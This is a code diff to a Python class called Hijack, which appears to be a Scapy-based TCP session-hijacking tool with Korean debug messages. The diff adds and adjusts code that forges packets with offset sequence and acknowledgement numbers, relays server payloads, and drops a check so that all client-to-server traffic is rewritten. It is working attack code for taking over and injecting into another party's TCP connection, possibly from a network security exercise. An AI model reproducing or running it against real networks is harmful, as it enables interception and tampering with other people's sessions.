@@ -70,6 +70,13 @@ class Hijack:
 					print("Start sending message to the server")
 
 					threading.Thread(target=self.input_loop, daemon=True).start()
+
+					new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack - self.my_offset, flags=tcp.flags)
+					if payload_len > 0:
+						new_packet = new_packet / Raw(load=packet.getlayer("Raw").load)
+						print("Received from server: " + packet.getlayer("Raw").load.decode())
+						self.my_ack += payload_len
+					send(new_packet, iface=self.dev, verbose=False)
 				else:
 					new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack - self.my_offset, flags=tcp.flags)
 					if payload_len > 0:
@@ -79,11 +86,8 @@ class Hijack:
 					send(new_packet, iface=self.dev, verbose=False)
 
 			#The packet is from client to server
-			elif tcp.sport == self.client_port and ip.src == self.client_ip and ip.dst == self.srv_ip:
+			elif ip.src == self.client_ip and ip.dst == self.srv_ip:
 				print("client -> server 패킷:  seq=%d ack=%d payload_len=%d" % (tcp.seq, tcp.ack, payload_len))
-				if not self.hijacked:
-					print("아직 hijack 안 됐으니 건너뜀")
-					return
 
 				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq + self.my_offset, ack=tcp.ack, flags=tcp.flags)
 				if payload_len > 0:
